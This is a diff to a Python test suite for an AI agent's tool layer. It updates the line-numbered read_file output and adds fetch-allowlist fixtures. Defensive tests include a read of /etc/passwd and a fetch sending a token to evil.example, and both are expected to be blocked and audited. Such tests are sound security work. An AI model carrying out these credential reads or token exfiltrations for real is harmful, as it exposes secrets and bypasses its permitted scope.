@@ -408,11 +408,13 @@ class TestPathContainment:
 class TestBuiltinHandlers:
     def test_read_returns_content(self, workspace: Path) -> None:
         out = toolbox.read_file((workspace,), "notes.md")
-        assert out.ok and out.content.startswith("alpha")
+        assert out.ok and out.content.startswith(f"{1:>6}\talpha")
 
     def test_read_window(self, workspace: Path) -> None:
         out = toolbox.read_file((workspace,), "notes.md", offset=2, limit=1)
-        assert out.content == "beta"
+        assert out.content == (
+            f"{2:>6}\tbeta\n\n[lines 2-2 of 3; call read with offset=3 for more]"
+        )
 
     def test_read_outside_the_root_fails_without_reading(self, workspace: Path) -> None:
         out = toolbox.read_file((workspace,), "/etc/passwd")
@@ -546,7 +548,8 @@ class TestBuiltinHandlers:
 
         monkeypatch.setattr(toolbox, "MAX_OUTPUT_CHARS", 1_000)
         out = toolbox.read_file((workspace,), "mid.txt")
-        assert out.ok and "[truncated: 4000 more characters]" in out.content
+        numbered_length = len(f"{1:>6}\t{body}")
+        assert out.ok and f"[truncated: {numbered_length - 1_000} more characters]" in out.content
 
 
 class TestDispatchChokepoint:
@@ -573,7 +576,7 @@ class TestDispatchChokepoint:
     def test_allowed_call_executes(self, ctx: ToolContext) -> None:
         res = dispatch_tool(_call("read", '{"path": "notes.md"}'), ctx, builtin_registry())
         assert res.ok and res.executed and res.decision == "allow"
-        assert res.content.startswith("alpha")
+        assert res.content.startswith(f"{1:>6}\talpha")
 
     def test_gated_command_is_not_executed(self, ctx: ToolContext) -> None:
         """An `ask` verdict blocks on the real approval store (`_isolate_gates` above pins TOOL_APPROVAL_TIMEOUT to 0), so with nothing ever granting it, it resolves to a fail-closed deny before `dispatch_tool` returns."""
@@ -749,6 +752,12 @@ class TestResultReportedBackToTheModel:
 
 
 class TestRegistry:
+    @pytest.fixture(autouse=True)
+    def _fetch_allowlisted(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        """`fetch` is offered only with an allowlist (agent-loop requirement 83); these tests
+        describe the full built-in set."""
+        monkeypatch.setattr(_cfg, "FETCH_ALLOWED_DOMAINS", ("api.example.test",), raising=True)
+
     def test_builtins_present(self) -> None:
         assert builtin_registry().names() == [
             "bash",
@@ -1014,6 +1023,7 @@ class TestRefusedCallsAreAudited:
         from docket.edges.adapters import fetch as fetch_mod
 
         monkeypatch.setattr(fetch_mod, "_allowed_domains", lambda: frozenset({"ok.example"}))
+        monkeypatch.setattr(_cfg, "FETCH_ALLOWED_DOMAINS", ("ok.example",), raising=True)
         url = json.dumps({"url": "https://evil.example/x?token=SECRETQ"})
         dispatch_tool(_call("fetch", url), ctx, builtin_registry())
         (entry,) = self._refused()
